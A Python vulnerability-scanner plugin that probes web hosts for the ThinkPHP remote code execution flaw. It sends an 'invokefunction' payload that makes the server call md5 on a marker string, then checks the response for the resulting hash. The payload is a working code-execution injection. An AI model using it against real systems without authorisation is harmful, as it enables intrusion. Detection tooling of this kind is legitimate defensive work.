#!/usr/bin/evn python
# coding=utf-8

from lib.poc.dummy import *
import rfc3986


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    payload = '?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Security@Test'

    for path in ['public/index.php', 'index.php', 'html/public/index.php']:
        try:
            url = '{}://{}:{}/{}{}'.format(service, ip, port, path, payload)
            r = await http_client(ip, port).get(url, timeout=20)
            if 'ed4c83e5a2b16420180747b356b4f7a8' in r.text:
                ret = {'alert_group': 'ThinkPHP Code Execution',
                       'affects': '{}:{}'.format(ip, port),
                       'thinkphp rce details': url}
                return ret
        except rfc3986.exceptions.ResolutionError as e:
            pass
        except Exception as e:
            debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
